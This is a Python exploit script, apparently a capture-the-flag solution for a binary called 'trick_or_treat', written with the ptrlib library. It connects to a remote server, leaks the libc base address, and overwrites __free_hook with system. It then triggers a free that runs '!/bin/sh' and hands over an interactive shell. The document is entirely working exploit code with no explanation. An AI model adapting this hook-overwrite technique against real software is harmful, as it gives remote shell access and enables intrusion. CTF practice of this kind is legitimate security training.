from ptrlib import *

def offset(addr):
    return (addr - ptr) // 8

libc = ELF("./libc.so.6")
#sock = Process("./trick_or_treat")
sock = Socket("3.112.41.140", 56746)

# leak libc base
payload = "9" * 8
sock.sendlineafter(":", payload)
sock.recvuntil(":")
ptr = int(sock.recvline(), 16)
libc_base = ptr - 0x10 + 0x5f5f000
logger.info("libc base = " + hex(libc_base))

# overwrite __free_hook
payload  = hex(offset(libc_base + libc.symbol("__free_hook")))[2:]
payload += " "
payload += hex(libc_base + libc.symbol("system"))[2:]
sock.sendlineafter(":", payload)

# get the shell!
payload  = "1" + "a"
payload += "a" * (0x800 - len(payload))
sock.sendlineafter(":", payload + " ed")
sock.sendline("!/bin/sh")

sock.interactive()
